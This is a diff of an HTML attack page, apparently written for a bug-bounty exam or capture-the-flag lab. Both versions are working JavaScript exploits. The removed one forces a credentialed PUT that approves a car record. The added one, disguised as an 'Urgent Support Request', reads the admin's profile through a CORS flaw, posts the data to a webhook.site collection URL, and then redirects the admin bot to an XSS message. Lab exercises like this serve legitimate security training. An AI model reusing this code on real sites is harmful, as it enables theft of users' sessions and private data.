@@ -1,60 +1,39 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Check</title></head>
+<head>
+    <title>Urgent Support Request</title>
+</head>
 <body>
+    <h1>Redirecting to Support Portal...</h1>
     <script>
-        (async () => {
+        // This script runs on YOUR page (no CSP) to force the ADMIN to do something
+        async function triggerAdmin() {
             const webhook = "https://webhook.site/44abceed-c38d-44d9-a954-d2774c57877b";
-            const targetCar = "https://api-bugbounty-exam.hashacademy.co/api/cars/69dd69884e3edba5f08f60f9";
             
-            const carUpdate = {
-                "make": "Pwned",
-                "model": "FlagSeeker",
-                "status": "approved", // Attempt to force state change
-                "isAvailable": true,
-                "description": "Exploit Triggered"
-            };
-
-            const formData = new FormData();
-            formData.append("carData", JSON.stringify(carUpdate));
-
+            // 1. Try to steal the Admin's session via the CORS bug we found
+            // If the CSP blocks script, we use the CORS reflection to read the flag!
             try {
-                // Step 1: Perform the PUT request with Admin's credentials
-                const res = await fetch(targetCar, {
-                    method: "PUT",
-                    body: formData,
+                const res = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
                     credentials: "include"
                 });
                 const data = await res.json();
-
-                // Step 2: Send the API's response (with the Flag) to your webhook
+                
+                // Send the Admin's private data (and likely Flag 5) to your webhook
                 await fetch(webhook, {
                     method: "POST",
                     mode: "no-cors",
-                    body: JSON.stringify({
-                        event: "CAR_APPROVED",
-                        apiResponse: data
-                    })
+                    body: JSON.stringify({ source: "CORS_BYPASS", admin_data: data })
                 });
+            } catch (e) {}
 
-                // Step 3: Bonus - Try to grab the Admin's full profile info too
-                const profileRes = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
-                    credentials: "include"
-                });
-                const profileData = await profileRes.json();
-                await fetch(webhook, {
-                    method: "POST",
-                    mode: "no-cors",
-                    body: JSON.stringify({
-                        event: "ADMIN_PROFILE_LEAK",
-                        profile: profileData
-                    })
-                });
+            // 2. Redirect the Admin to the message you just sent
+            // This ensures the Bot actually "views" your XSS payload
+            setTimeout(() => {
+                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e555d6bee6d6b7c6636f0d";
+            }, 2000);
+        }
 
-            } catch (e) {
-                fetch(webhook, { method: "POST", mode: "no-cors", body: "Error: " + e.message });
-            }
-        })();
+        triggerAdmin();
     </script>
 </body>
 </html>
